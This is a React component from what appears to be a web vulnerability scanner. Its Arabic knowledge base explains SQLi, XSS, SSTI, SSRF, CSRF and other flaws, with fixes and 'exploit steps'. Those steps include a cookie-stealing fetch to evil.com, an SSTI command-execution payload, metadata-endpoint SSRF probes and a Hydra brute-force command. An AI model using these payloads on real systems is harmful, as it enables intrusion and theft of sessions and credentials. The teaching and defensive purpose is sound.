/**
 * VulnDetailDrawer — Arabic explanation + PoC for any finding.
 * FIXED 2026-09-19: full KB with no nested quotes.
 */
import { useEffect, useState } from "react"
import { useTranslation } from "react-i18next"

const SEV_COLORS = {
  critical: "#dc2626",
  high:     "#ea580c",
  medium:   "#ca8a04",
  low:      "#16a34a",
  info:     "#0891b2",
}

// ============================================================
// Knowledge Base
// ============================================================
const KB = {
  // ============ INJECTIONS ============
  sqli: {
    name: "SQL Injection",
    category: "Injection",
    icon: "💥",
    cvss: "9.8",
    cwe: "CWE-89",
    what: "حقن أوامر SQL في قاعدة البيانات عبر مدخلات المستخدم. يحدث عندما يدمج التطبيق مدخلات المستخدم مباشرة في استعلامات SQL بدون تنقية.",
    how: "حقن payloads اختبارية مثل `' OR '1'='1` و `' AND SLEEP(5)--`. فحص أخطاء SQL أو تأخير زمني في الرد.",
    impact: "قراءة كامل قاعدة البيانات، تعديل/حذف بيانات، تجاوز المصادقة، وفي حالات متقدمة RCE.",
    fix: "استخدم Prepared Statements. لا تدمج مدخلات المستخدم في SQL. استخدم ORM. طبّق principle of least privilege.",
    refs: ["OWASP: SQL Injection", "CWE-89"],
    exploit_steps: [
      "1. تحديد المعامل القابل للحقن من النتيجة",
      "2. حقن payload بسيط: `'`",
      "3. Time-based blind: `' AND SLEEP(5)--`",
      "4. إذا تأخر الرد 5+ ثوان → vulnerable",
      "5. استخدم sqlmap: sqlmap -u URL --technique=T --dbs",
    ],
    tools: [
      { name: "sqlmap", desc: "أتمتة كاملة", cmd: "sqlmap -u URL --technique=T --dbs --batch" },
      { name: "Burp Intruder", desc: "اختبار يدوي", cmd: "SQLi payloads" },
    ],
  },
  nosql: {
    name: "NoSQL Injection",
    category: "Injection",
    icon: "💥",
    cvss: "9.1",
    cwe: "CWE-943",
    what: "حقن في قواعد بيانات NoSQL (MongoDB, CouchDB) عبر معاملات JSON أو URL.",
    how: "حقن `{\"$ne\": null}` أو `[$ne]=1` في المعاملات. فحص تغيّر سلوك الرد.",
    impact: "تجاوز المصادقة (`password[$ne]=x`)، قراءة بيانات، تعديل.",
    fix: "تحقق من نوع المدخلات. استخدم ORM آمن. عطّل `$where` في MongoDB.",
    refs: ["OWASP: NoSQL Injection", "CWE-943"],
    exploit_steps: [
      "1. تحديد معامل login أو query",
      "2. حقن: `username[$ne]=admin&password[$ne]=x`",
      "3. إذا نجح الدخول بدون كلمة مرور → vulnerable",
      "4. لـ Time-based: `[$where]=sleep(5000)`",
      "5. جرّب `{$regex: \".*\"}` لاستخراج البيانات",
    ],
    tools: [
      { name: "NoSQLMap", desc: "أتمتة NoSQL", cmd: "python nosqlmap.py -u URL" },
    ],
  },
  ssti: {
    name: "Server-Side Template Injection",
    category: "Injection",
    icon: "🎭",
    cvss: "9.8",
    cwe: "CWE-94",
    what: "حقن قوالب في محرك القوالب (Jinja2, Twig, Freemarker). يحدث عندما تُعرض مدخلات المستخدم كجزء من القالب.",
    how: "حقن `{{7*7}}` أو `${7*7}`، فحص إذا ظهر `49` في الرد.",
    impact: "RCE كامل، قراءة ملفات، تنفيذ أوامر نظام.",
    fix: "لا تمرر مدخلات المستخدم كقوالب. استخدم sandbox. تحقق من المدخلات.",
    refs: ["OWASP: SSTI", "CWE-94"],
    exploit_steps: [
      "1. حقن `{{7*7}}` في كل معامل",
      "2. إذا ظهر `49` في الرد → SSTI مؤكد",
      "3. حدد محرك القوالب (Jinja2/Twig/Freemarker)",
      "4. استخدم payloads مخصصة لكل محرك",
      "5. للحصول على RCE: `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}`",
    ],
    tools: [
      { name: "tplmap", desc: "SSTI exploitation", cmd: "tplmap -u URL" },
      { name: "SSTI-Payloads", desc: "قائمة payloads", cmd: "github.com/payloadbox/ssti-payloads" },
    ],
  },
  proto_pollution: {
    name: "Prototype Pollution",
    category: "Injection",
    icon: "☣️",
    cvss: "8.2",
    cwe: "CWE-1321",
    what: "تلويث Object.prototype في JavaScript عبر __proto__ أو constructor.prototype. يؤدي لتغيير سلوك التطبيق كاملاً.",
    how: "حقن `__proto__[polluted]=yes` في معاملات URL أو JSON body. فحص إذا ظهر في الرد.",
    impact: "تجاوز فحوصات (if user.isAdmin)، XSS، DoS، وفي حالات معينة RCE.",
    fix: "استخدم `Object.create(null)`. جمّد prototype: `Object.freeze(Object.prototype)`. استخدم مكتبات آمنة.",
    refs: ["OWASP: Prototype Pollution", "CWE-1321"],
    exploit_steps: [
      "1. حقن `__proto__[falcon]=yes` في معامل",
      "2. حقن `constructor[prototype][falcon]=yes`",
      "3. أعد تحميل الصفحة الرئيسية",
      "4. إذا تغيّر السلوك → pollution نجح",
      "5. جرّب تلويث خصائص حساسة: isAdmin, role",
    ],
    tools: [
      { name: "pp-finder", desc: "Prototype pollution detection", cmd: "github.com/yeswehack/pp-finder" },
      { name: "nuclei", desc: "Automated", cmd: "nuclei -t prototype-pollution" },
    ],
  },

  // ============ XSS ============
  xss: {
    name: "Cross-Site Scripting (XSS)",
    category: "XSS",
    icon: "💉",
    cvss: "6.1",
    cwe: "CWE-79",
    what: "حقن كود JavaScript في صفحات الويب. يظهر مباشرة (Reflected) أو يُخزَّن (Stored) أو ينفَّذ في المتصفح (DOM).",
    how: "حقن payloads XSS في كل معامل URL، وفحص إذا ظهر في الرد بدون ترميز.",
    impact: "سرقة cookies، إعادة توجيه المستخدم، تنفيذ إجراءات نيابة عنه، نشر ديدان.",
    fix: "ترميز كل المخرجات. استخدم CSP قوياً. تحقق من المدخلات.",
    refs: ["OWASP: XSS Prevention", "CWE-79"],
    exploit_steps: [
      "1. تحديد معامل URL أو حقل نموذج",
      "2. حقن `<script>alert(1)</script>`",
      "3. فحص الرد: هل ظهر الكود بدون ترميز؟",
      "4. تحقق من السياق (HTML / JS / Attribute)",
      "5. استخدم payload مسروق: `fetch('https://evil.com?c='+document.cookie)`",
    ],
    tools: [
      { name: "XSStrike", desc: "XSS scanner متقدم", cmd: "xsstrike -u URL" },
      { name: "dalfox", desc: "سريع ومحترف", cmd: "dalfox url URL" },
    ],
  },
  dom_xss: {
    name: "DOM-Based XSS",
    category: "XSS",
    icon: "🌐",
    cvss: "7.1",
    cwe: "CWE-79",
    what: "تمرير بيانات من مصدر غير موثوق (location.href) إلى نقطة حقن خطرة (innerHTML) داخل JavaScript.",
    how: "قراءة ملفات JS، البحث عن أنماط location.href → innerHTML.",
    impact: "حقن JavaScript في الصفحة، سرقة الجلسة، إعادة توجيه.",
    fix: "استخدم textContent بدلاً من innerHTML. استخدم DOMPurify. CSP قوي.",
    refs: ["OWASP: DOM XSS", "CWE-79"],
    exploit_steps: [
      "1. راجع ملف JS المذكور",
      "2. ابحث عن مصدر → نقطة الحقن",
      "3. تحقق يدوياً هل البيانات من location",
      "4. جرّب حقن payload عبر URL fragment أو query",
    ],
    tools: [
      { name: "Burp DOM Invader", desc: "DOM XSS tool", cmd: "Burp Suite Pro" },
    ],
  },

  // ============ ACCESS CONTROL ============
  idor: {
    name: "Insecure Direct Object Reference",
    category: "Access Control",
    icon: "🚪",
    cvss: "6.5",
    cwe: "CWE-639",
    what: "الوصول إلى موارد مستخدمين آخرين بتغيير معامل رقمي (ID) في الطلب.",
    how: "اكتشاف معاملات رقمية، حقن IDs بديلة (1, 999999)، ومقارنة الردود.",
    impact: "قراءة/تعديل/حذف بيانات مستخدمين آخرين، تصعيد صلاحيات.",
    fix: "تحقق من صلاحيات المستخدم على كل طلب. استخدم UUIDs بدلاً من IDs متسلسلة.",
    refs: ["OWASP: IDOR", "CWE-639"],
    exploit_steps: [
      "1. حدد URL مع ID رقمي (user/123)",
      "2. جرّب ID بديل: user/124",
      "3. إذا عُرضت بيانات مستخدم آخر → vulnerable",
      "4. جرّب IDs كبيرة (999999) لبيانات محذوفة",
      "5. استخدم Burp Intruder لأتمتة التخمين",
    ],
    tools: [
      { name: "Burp Intruder", desc: "Fuzzing IDs", cmd: "Burp Suite Pro" },
      { name: "ffuf", desc: "ID fuzzing", cmd: "ffuf -u URL/user/FUZZ -w ids.txt" },
    ],
  },
  csrf: {
    name: "Cross-Site Request Forgery",
    category: "Access Control",
    icon: "🎭",
    cvss: "8.8",
    cwe: "CWE-352",
    what: "نموذج POST بدون CSRF token — يمكن للمهاجم جعل المستخدم المُسجَّل يُرسل طلبات خطرة.",
    how: "تحليل كل نماذج HTML. البحث عن `csrf` أو `token` في الحقول.",
    impact: "تحويل مال، تغيير بريد/كلمة مرور، حذف حساب بدون علم المستخدم.",
    fix: "أضف CSRF token فريد لكل جلسة. تحقق من Origin/Referer. SameSite=Lax/Strict.",
    refs: ["OWASP: CSRF", "CWE-352"],
    exploit_steps: [
      "1. ابحث عن form POST حساس (transfer, change-email)",
      "2. أنشئ صفحة HTML تحاكي الطلب",
      "3. أرسل الضحية إلى صفحتك",
      "4. سيرسل المتصفح الكوكيز تلقائياً",
      "5. الطلب يُنفَّذ نيابة عن الضحية",
    ],
    tools: [
      { name: "Burp CSRF PoC", desc: "Generate PoC", cmd: "Right-click → Engagement tools → CSRF PoC" },
    ],
  },
  clickjacking: {
    name: "Clickjacking",
    category: "UI Redressing",
    icon: "🖼️",
    cvss: "4.3",
    cwe: "CWE-1021",
    what: "إمكانية تضمين الموقع في iframe على موقع آخر (X-Frame-Options + CSP frame-ancestors مفقودان).",
    how: "فحص ترويسات `X-Frame-Options` و `Content-Security-Policy: frame-ancestors`.",
    impact: "خداع المستخدم للضغط على أزرار حساسة (حذف حساب، تأكيد تحويل).",
    fix: "أضف `X-Frame-Options: DENY` و `CSP: frame-ancestors 'none'`.",
    refs: ["OWASP: Clickjacking Defense", "CWE-1021"],
    exploit_steps: [
      "1. أنشئ صفحة HTML مع iframe للموقع",
      "2. اجعل الـ iframe شفافاً opacity:0.0001",
      "3. أضف أزرار زائفة فوق الـ iframe",
      "4. عندما يضغط الضحية → يضغط على زر الموقع الحقيقي",
    ],
    tools: [
      { name: "Clickjack PoC", desc: "HTML generator", cmd: "github.com/3gstudent/clickjacking-poc" },
    ],
  },

  // ============ SERVER-SIDE ============
  ssrf: {
    name: "Server-Side Request Forgery",
    category: "Server-Side",
    icon: "🌐",
    cvss: "9.1",
    cwe: "CWE-918",
    what: "جعل السيرفر يزور URL يختاره المهاجم (داخلي أو خارجي).",
    how: "حقن URLs داخلية (`http://127.0.0.1`, `http://169.254.169.254`) في كل معامل URL.",
    impact: "الوصول لخدمات داخلية (Redis, DB, AWS metadata)، قراءة ملفات محلية، تجاوز firewall.",
    fix: "قائمة بيضاء للـ URLs. حظر العناوين الداخلية. لا تتبع redirects. استخدم service proxy.",
    refs: ["OWASP: SSRF", "CWE-918"],
    exploit_steps: [
      "1. ابحث عن معامل يقبل URL (url, redirect, fetch)",
      "2. جرّب `http://127.0.0.1:80` أو `http://localhost:22`",
      "3. جرّب AWS metadata: `http://169.254.169.254/latest/meta-data/`",
      "4. جرّب `file:///etc/passwd`",
      "5. استخدم Burp Collaborator للـ blind SSRF",
    ],
    tools: [
      { name: "SSRFmap", desc: "SSRF exploitation", cmd: "python ssrfmap.py -r req.txt -p url" },
      { name: "Burp Collaborator", desc: "Blind SSRF", cmd: "Burp Suite Pro" },
    ],
  },
  path_traversal: {
    name: "Path Traversal / LFI",
    category: "File Access",
    icon: "📂",
    cvss: "7.5",
    cwe: "CWE-22",
    what: "حقن `../` للوصول إلى ملفات خارج web root.",
    how: "حقن `../../../etc/passwd` و `..%2F..%2F` في معاملات الملفات.",
    impact: "قراءة ملفات حساسة: passwd، SSH keys، config files، source code.",
    fix: "تحقق من أسماء الملفات (whitelist). استخدم basename(). لا تعتمد على مدخلات المستخدم في المسارات.",
    refs: ["OWASP: Path Traversal", "CWE-22"],
    exploit_steps: [
      "1. تحديد معامل يقرأ ملفاً (file, path, page)",
      "2. حقن `../../../etc/passwd`",
      "3. إذا ظهر `root:x:0:0` → vulnerable",
      "4. جرّب bypasses: `....//`, `%2e%2e%2f`, null byte",
      "5. ابحث عن ملفات config, .env, .git",
    ],
    tools: [
      { name: "ffuf", desc: "Fuzzing", cmd: "ffuf -u URL?file=FUZZ -w lfi.txt" },
      { name: "LFISuite", desc: "Automated LFI", cmd: "python lfisuite.py" },
    ],
  },
  open_redirect: {
    name: "Open Redirect",
    category: "Redirect",
    icon: "↪️",
    cvss: "4.7",
    cwe: "CWE-601",
    what: "معامل يسمح بإعادة التوجيه لأي URL خارجي.",
    how: "حقن `https://evil.example.com` في معاملات مثل `url`, `redirect`, `next`.",
    impact: "phishing — المستخدم يثق في bank.com/redirect?url=evil.com.",
    fix: "قائمة بيضاء للـ URLs. استخدم mapping (IDs داخلية).",
    refs: ["OWASP: Open Redirect", "CWE-601"],
    exploit_steps: [
      "1. ابحث عن معامل redirect",
      "2. جرّب `?url=https://evil.com`",
      "3. إذا تحوّل الرد إلى evil.com → vulnerable",
      "4. جرّب bypasses: `//evil.com`, `https:evil.com`, `@evil.com`",
    ],
    tools: [
      { name: "Burp", desc: "Manual testing", cmd: "Repeater + redirect payloads" },
    ],
  },

  // ============ HEADERS ============
  headers: {
    name: "ترويسات HTTP مفقودة",
    category: "Headers",
    icon: "📋",
    cvss: "5.3",
    cwe: "CWE-693",
    what: "الموقع لا يُرسل ترويسات أمان HTTP الضرورية (CSP, X-Frame-Options, HSTS, إلخ).",
    how: "فحص كل ترويسة HTTP في الرد ومقارنتها بقائمة OWASP.",
    impact: "المتصفح يفقد طبقات دفاع ضد XSS، Clickjacking، و MITM.",
    fix: "أضف الترويسات: CSP, X-Frame-Options, HSTS, X-Content-Type-Options, Referrer-Policy, Permissions-Policy.",
    refs: ["OWASP: Secure Headers Project"],
    exploit_steps: [
      "1. راجع الترويسة المفقودة في البيانات",
      "2. بدون CSP → XSS أسهل",
      "3. بدون HSTS → MITM ممكن",
      "4. بدون X-Frame-Options → Clickjacking",
    ],
    tools: [
      { name: "securityheaders.com", desc: "فحص سريع", cmd: "https://securityheaders.com/" },
      { name: "Mozilla Observatory", desc: "تحليل شامل", cmd: "https://observatory.mozilla.org/" },
    ],
  },

  // ============ INFRASTRUCTURE ============
  http_methods: {
    name: "طرق HTTP خطرة",
    category: "Configuration",
    icon: "⚙️",
    cvss: "5.3",
    cwe: "CWE-650",
    what: "طرق HTTP مفتوحة (TRACE، PUT، DELETE) قد تُستغل.",
    how: "إرسال كل طرق HTTP للهدف، وفحص الرد.",
    impact: "TRACE → سرقة cookies (XST). PUT → رفع ملفات. DELETE → حذف.",
    fix: "عطّل الطرق غير المستخدمة في nginx/apache. اسمح فقط بـ GET/POST/HEAD.",
    refs: ["OWASP: HTTP Methods", "CWE-650"],
    exploit_steps: [
      "1. TRACE: `curl -X TRACE URL` — إذا رجع 200 → XST محتمل",
      "2. PUT: `curl -X PUT URL/file.txt -d data` — إذا 201 → رفع ملفات",
      "3. استخدم الطرق الخطرة لاستغلال النظام",
    ],
    tools: [
      { name: "curl", desc: "Test methods", cmd: "curl -X TRACE URL" },
      { name: "nmap", desc: "HTTP methods", cmd: "nmap --script http-methods URL" },
    ],
  },
  rate_limit: {
    name: "Rate Limiting مفقود",
    category: "Configuration",
    icon: "⏱️",
    cvss: "3.7",
    cwe: "CWE-770",
    what: "لا يوجد حد لعدد الطلبات المتكررة.",
    how: "إرسال 20 طلب متتالي وفحص وجود `429 Too Many Requests`.",
    impact: "Brute force، DDoS، scraping بدون قيود.",
    fix: "طبّق rate limiting (nginx limit_req). استخدم Cloudflare/AWS WAF.",
    refs: ["OWASP: Blocking Brute Force", "CWE-770"],
    exploit_steps: [
      "1. أرسل 100 طلب login متتالي",
      "2. إذا لم تُحظر → brute force ممكن",
      "3. استخدم Hydra لأتمتة الهجوم",
      "4. على login forms، يسمح بسرقة كلمات مرور ضعيفة",
    ],
    tools: [
      { name: "Hydra", desc: "Brute force", cmd: "hydra -l admin -P wordlist.txt URL http-post-form" },
      { name: "ffuf", desc: "Fuzzing", cmd: "ffuf -u URL -w wordlist.txt -rate 100" },
    ],
  },
  cookies: {
    name: "Cookies بدون حماية",
    category: "Configuration",
    icon: "🍪",
    cvss: "4.3",
    cwe: "CWE-1004",
    what: "Cookies بدون علامات Secure, HttpOnly, SameSite.",
    how: "فحص خصائص كل cookie في الرد.",
    impact: "بدون Secure → MITM. بدون HttpOnly → XSS يقرأها. بدون SameSite → CSRF.",
    fix: "أضف: `Secure; HttpOnly; SameSite=Lax` (أو Strict).",
    refs: ["OWASP: Cookies", "CWE-1004"],
    exploit_steps: [
      "1. افحص cookies في DevTools → Application",
      "2. إذا sessionid بدون HttpOnly → XSS",
      "3. إذا بدون Secure → MITM على HTTP",
      "4. إذا بدون SameSite → CSRF",
    ],
    tools: [
      { name: "Cookie Editor", desc: "Browser extension", cmd: "chrome.google.com/webstore" },
    ],
  },
  cors: {
    name: "CORS Misconfiguration",
    category: "Configuration",
    icon: "🌍",
    cvss: "7.5",
    cwe: "CWE-942",
    what: "إعداد CORS يسمح لأي origin بالوصول للبيانات.",
    how: "إرسال طلبات مع Origin مهاجم، وفحص `Access-Control-Allow-Origin`.",
    impact: "سرقة بيانات المستخدم من مواقع خارجية (مع credentials).",
    fix: "قائمة بيضاء دقيقة للـ origins. لا تستخدم `*` مع credentials.",
    refs: ["OWASP: CORS", "CWE-942"],
    exploit_steps: [
      "1. أرسل `Origin: https://evil.com`",
      "2. افحص `Access-Control-Allow-Origin` في الرد",
      "3. إذا أعاد evil.com → vulnerable",
      "4. جرّب `Origin: null` لـ iframe hijack",
      "5. استخدم `fetch('bank.com/api', {credentials:'include'})`",
    ],
    tools: [
      { name: "Burp", desc: "Manual CORS test", cmd: "Repeater + Origin header" },
      { name: "corsy", desc: "CORS scanner", cmd: "python corsy.py -u URL" },
    ],
  },
  port_scanner: {
    name: "منافذ مفتوحة",
    category: "Network",
    icon: "🔌",
    cvss: "0.0",
    cwe: "CWE-1327",
    what: "منافذ TCP مفتوحة على السيرفر.",
    how: "محاولة الاتصال بـ 18 منفذ شائع وفحص الاستجابة.",
    impact: "منافذ غير متوقعة → خدمات إدارية مكشوفة (Redis, MySQL, VNC).",
    fix: "أغلق المنافذ غير الضرورية. استخدم firewall. قيّد الوصول بـ IP.",
    refs: ["OWASP: Attack Surface", "CWE-1327"],
    exploit_steps: [
      "1. راجع المنافذ المفتوحة",
      "2. منافذ غير قياسية → خدمات مخفية",
      "3. جرّب الاتصال اليدوي: `nc -v target port`",
      "4. افتح الموقع على `http://target:port`",
    ],
    tools: [
      { name: "nmap", desc: "Port scanner", cmd: "nmap -sV target" },
      { name: "masscan", desc: "سريع جداً", cmd: "masscan -p1-65535 target --rate=1000" },
    ],
  },
  tls: {
    name: "TLS/SSL",
    category: "Cryptography",
    icon: "🔐",
    cvss: "5.9",
    cwe: "CWE-326",
    what: "بروتوكولات TLS/SSL ضعيفة أو معلومات الشهادة.",
    how: "الاتصال بـ 443 وفحص البروتوكول الفعلي، cipher، الشهادة.",
    impact: "TLS 1.0/1.1 → POODLE/BEAST. شهادة منتهية → MITM.",
    fix: "TLS 1.2+ فقط. Ciphers قوية. HSTS. جدّد الشهادات تلقائياً.",
    refs: ["OWASP: TLS Cheat Sheet", "CWE-326"],
    exploit_steps: [
      "1. افحص البروتوكولات المدعومة: `nmap --script ssl-enum-ciphers -p 443 target`",
      "2. إذا TLS 1.0/1.1 → vulnerable",
      "3. اختبر الشهادة: `openssl s_client -connect target:443`",
      "4. إذا منتهية → MITM ممكن",
    ],
    tools: [
      { name: "testssl.sh", desc: "TLS audit شامل", cmd: "testssl.sh target" },
      { name: "sslscan", desc: "سريع", cmd: "sslscan target:443" },
    ],
  },
  subdomain: {
    name: "Subdomains مكتشفة",
    category: "Recon",
    icon: "🌐",
    cvss: "0.0",
    cwe: "—",
    what: "subdomains محتملة للهدف (www, admin, dev, ...).",
    how: "تجربة subdomains شائعة عبر DNS resolution.",
    impact: "subdomains قد تكون أقل حماية → مدخل للاختراق.",
    fix: "راجع subdomains يدوياً. احذف غير المستخدمة. راقب شهادات SSL.",
    refs: ["OWASP: Enumerate Infrastructure", "PTES: Intelligence Gathering"],
    exploit_steps: [
      "1. راجع قائمة subdomains",
      "2. جرّب فتحها: `https://sub.target.com`",
      "3. ابحث عن لوحات admin / dev / staging",
      "4. استخدم subfinder للأتمتة",
    ],
    tools: [
      { name: "subfinder", desc: "Subdomain enum", cmd: "subfinder -d target.com" },
      { name: "amass", desc: "شامل", cmd: "amass enum -d target.com" },
    ],
  },

  // ============ FALLBACK ============
  default: {
    name: "ثغرة أمنية",
    category: "General",
    icon: "🔍",
    cvss: "—",
    cwe: "—",
    what: "ثغرة مكتشفة بواسطة Falcon MAG. راجع البيانات الفعلية من الفحص.",
    how: "استخدم module مخصص للكشف.",
    impact: "يعتمد على نوع الثغرة.",
    fix: "راجع URL والـ payload المذكورين.",
    refs: ["OWASP Top 10"],
    exploit_steps: [
      "1. راجع البيانات الفعلية من الفحص",
      "2. ابحث عن CVEs للتقنية",
      "3. جرّب استغلال يدوي",
    ],
    tools: [],
  },
}

function findKnowledge(finding) {
  if (!finding) return KB.default
  const cls = (finding.vuln_class || "").toLowerCase()
  const sub = (finding.subtype || finding.title || "").toLowerCase()
  const param = (finding.param || "").toLowerCase()
  const combined = cls + " " + sub + " " + param

  // Priority matching
  if (combined.includes("blind_time_mysql") || combined.includes("sqli") || combined.includes("sql")) return KB.sqli
  if (combined.includes("nosql")) return KB.nosql
  if (combined.includes("ssti") || combined.includes("template")) return KB.ssti
  if (combined.includes("proto") && combined.includes("pollution")) return KB.proto_pollution
  if (combined.includes("dom") && combined.includes("xss")) return KB.dom_xss
  if (combined.includes("xss")) return KB.xss
  if (combined.includes("csrf")) return KB.csrf
  if (combined.includes("clickjack")) return KB.clickjacking
  if (combined.includes("ssrf")) return KB.ssrf
  if (combined.includes("path") || combined.includes("traversal") || combined.includes("lfi")) return KB.path_traversal
  if (combined.includes("open_redirect") || combined.includes("redirect")) return KB.open_redirect
  if (combined.includes("idor")) return KB.idor
  if (combined.includes("header")) return KB.headers
  if (combined.includes("http_methods") || combined.includes("http-method")) return KB.http_methods
  if (combined.includes("rate_limit") || combined.includes("rate-limit")) return KB.rate_limit
  if (combined.includes("cookie")) return KB.cookies
  if (combined.includes("cors")) return KB.cors
  if (combined.includes("port")) return KB.port_scanner
  if (combined.includes("tls") || combined.includes("ssl")) return KB.tls
  if (combined.includes("subdomain")) return KB.subdomain
  return KB.default
}

// ============================================================
// Main Component
// ============================================================
export default function VulnDetailDrawer({ finding, onClose }) {
  const { i18n } = useTranslation()
  const isRtl = i18n.language === "ar"
  const [aiAnalysis, setAiAnalysis] = useState(null)
  const [aiLoading, setAiLoading] = useState(false)

  useEffect(() => {
    const onKey = (e) => { if (e.key === "Escape") onClose() }
    document.addEventListener("keydown", onKey)
    return () => document.removeEventListener("keydown", onKey)
  }, [onClose])

  useEffect(() => {
    if (!finding?.id || !finding?.scan_id) return
    setAiLoading(true)
    const token = localStorage.getItem("token")
    fetch("/api/v2/scans/ai/" + finding.scan_id, {
      headers: token ? { Authorization: "Bearer " + token } : {},
    })
      .then(res => res.ok ? res.json() : null)
      .then(data => {
        if (!data?.analyses) return
        const match = data.analyses.find(a => a.finding_id === finding.id)
        setAiAnalysis(match || null)
      })
      .catch(() => {})
      .finally(() => setAiLoading(false))
  }, [finding?.id, finding?.scan_id])

  if (!finding) return null

  const k = findKnowledge(finding)
  const sev = (finding.severity || "info").toLowerCase()
  const sevColor = SEV_COLORS[sev] || SEV_COLORS.info

  // Build cURL safely
  let curlCmd = ""
  if (finding.url) {
    const safeUrl = finding.url.replace(/"/g, "%22")
    curlCmd = 'curl -w "\\n[Time: %{time_total}s]\\n" \\\n  "' + safeUrl + '" \\\n  -H "User-Agent: Mozilla/5.0 (Falcon-MAG)" \\\n  -s -o /dev/null'
  }

  // Build Python command safely
  let pyCmd = ""
  if (finding.url) {
    const safeUrl = finding.url.replace(/"/g, "%22")
    pyCmd = 'import requests\nimport time\n\n# PoC for ' + (finding.vuln_class || "vulnerability") + '\ntarget = "' + safeUrl + '"\n\nstart = time.time()\nrequests.get(target, timeout=15, verify=False)\nbaseline = time.time() - start\n\nprint("Baseline: %.2fs" % baseline)\nprint("Target: " + target)\nprint("")\nprint("Next steps:")\nprint("  1. Review payload in the Drawer")\nprint("  2. Use tools like sqlmap / ffuf / nuclei")\nprint("  3. Test manually in Burp Suite")'
  }

  return (
    <>
      <div onClick={onClose} className="fixed inset-0 z-[9990]" style={{ background: "rgba(0,0,0,0.5)" }} />

      <aside className="fixed top-0 bottom-0 z-[9991] overflow-y-auto"
        style={{
          [isRtl ? "right" : "left"]: 0,
          width: "min(720px, 100vw)",
          background: "var(--bg-secondary)",
          borderInlineStart: "3px solid " + sevColor,
          boxShadow: "0 0 40px rgba(0,0,0,0.6)",
        }}>

        <div className="sticky top-0 z-10 px-5 py-4 flex items-start justify-between gap-3"
          style={{ background: "var(--bg-secondary)", borderBottom: "1px solid var(--border-color)" }}>
          <div className="flex items-start gap-3 min-w-0">
            <span className="text-3xl shrink-0">{k.icon || "🔍"}</span>
            <div className="min-w-0">
              <div className="text-xs font-mono uppercase tracking-wider mb-1"
                style={{ color: sevColor, fontWeight: "bold" }}>
                {sev.toUpperCase()} · {k.category || "—"}
                {k.cvss && k.cvss !== "—" && <span className="ms-2" style={{ color: "#fca5a5" }}>CVSS {k.cvss}</span>}
              </div>
              <h2 className="text-lg font-bold" style={{ color: "var(--text-primary)" }}>{k.name}</h2>
              {k.cwe && k.cwe !== "—" && (
                <div className="text-[10px] font-mono mt-1" style={{ color: "var(--text-muted)" }}>{k.cwe}</div>
              )}
            </div>
          </div>
          <button onClick={onClose}
            className="px-3 py-1 rounded text-sm font-bold shrink-0"
            style={{ background: "var(--bg-tertiary)", color: "var(--text-primary)", border: "1px solid var(--border-color)", cursor: "pointer" }}>
            ✕
          </button>
        </div>

        <div className="p-5 space-y-6">
          <Section title="📖 ما هي هذه الثغرة؟">{k.what}</Section>
          <Section title="🔬 كيف تُكتشف؟">{k.how}</Section>
          <Section title="💥 التأثير الحقيقي" tone="danger">{k.impact}</Section>

          {k.exploit_steps && k.exploit_steps.length > 0 && (
            <div>
              <SectionTitle tone="danger">🎯 خطوات الاستغلال</SectionTitle>
              <ol className="mt-2 space-y-2 text-sm list-none">
                {k.exploit_steps.map((s, i) => (
                  <li key={i} className="flex gap-2" style={{ color: "#fca5a5" }}>
                    <span className="shrink-0 font-bold font-mono" style={{ color: "#ef4444" }}>→</span>
                    <span style={{ whiteSpace: "pre-wrap", lineHeight: 1.7 }}>{s}</span>
                  </li>
                ))}
              </ol>
            </div>
          )}

          {curlCmd && finding.url && (
            <CodeBlock title="⚡ كود cURL" code={curlCmd} lang="bash" />
          )}

          {pyCmd && finding.url && (
            <CodeBlock title="🐍 كود Python" code={pyCmd} lang="python" />
          )}

          {k.tools && k.tools.length > 0 && (
            <div>
              <SectionTitle>🛠️ أدوات الاستغلال</SectionTitle>
              <div className="mt-2 space-y-2">
                {k.tools.map((t, i) => (
                  <div key={i} className="rounded p-3 text-xs"
                    style={{ background: "var(--bg-tertiary)", border: "1px solid var(--border-color)" }}>
                    <div className="font-bold mb-1" style={{ color: "var(--accent-cyan)" }}>{t.name}</div>
                    <div className="mb-2 text-[11px]" style={{ color: "var(--text-muted)" }}>{t.desc}</div>
                    <code className="block px-3 py-2 rounded text-[11px]"
                      style={{ background: "rgba(0,0,0,0.4)", color: "var(--accent-yellow)", fontFamily: "monospace", direction: "ltr", textAlign: "left", whiteSpace: "pre", overflowX: "auto" }}>
                      {t.cmd}
                    </code>
                  </div>
                ))}
              </div>
            </div>
          )}

          {(finding.url || finding.param || finding.payload || finding.evidence) && (
            <div>
              <SectionTitle>🎯 البيانات من الفحص</SectionTitle>
              <div className="space-y-2 mt-2 p-3 rounded"
                style={{ background: "rgba(6,182,212,0.05)", border: "1px solid rgba(6,182,212,0.2)" }}>
                {finding.url && <DataRow label="URL" value={finding.url} mono wrap />}
                {finding.param && <DataRow label="المعامل" value={finding.param} mono />}
                {finding.payload && <DataRow label="الحمولة" value={finding.payload} mono />}
                {finding.evidence && <DataRow label="الدليل" value={finding.evidence} mono wrap />}
              </div>
            </div>
          )}

          <Section title="🛠️ كيفية الإصلاح" tone="success">{k.fix}</Section>

          {k.refs && k.refs.length > 0 && (
            <Section title="📚 مراجع">
              <ul className="list-disc list-inside space-y-1 text-xs opacity-90">
                {k.refs.map((r, i) => <li key={i}>{r}</li>)}
              </ul>
            </Section>
          )}

          {(aiLoading || aiAnalysis) && (
            <div>
              <SectionTitle>🤖 تحليل DeepSeek AI</SectionTitle>
              {aiLoading && <div className="mt-2 text-xs" style={{ color: "var(--text-muted)" }}>جارٍ التحميل...</div>}
              {aiAnalysis && (
                <div className="mt-2 space-y-3 text-sm p-3 rounded"
                  style={{ background: "rgba(139,92,246,0.05)", border: "1px solid rgba(139,92,246,0.3)" }}>
                  {aiAnalysis.cvss_score > 0 && (
                    <div className="flex items-center gap-3">
                      <div className="text-2xl font-bold font-mono"
                        style={{ color: aiAnalysis.cvss_score >= 7 ? "#dc2626" : aiAnalysis.cvss_score >= 4 ? "#ca8a04" : "#16a34a" }}>
                        {aiAnalysis.cvss_score.toFixed(1)}
                      </div>
                    </div>
                  )}
                  {aiAnalysis.summary && (
                    <div>
                      <div className="text-xs font-bold mb-1" style={{ color: "var(--accent-cyan)" }}>📝 الملخص</div>
                      <p style={{ whiteSpace: "pre-wrap" }}>{aiAnalysis.summary}</p>
                    </div>
                  )}
                </div>
              )}
            </div>
          )}

          <div className="pt-3 mt-3 text-xs"
            style={{ borderTop: "1px solid var(--border-color)", color: "var(--text-muted)", fontFamily: "monospace" }}>
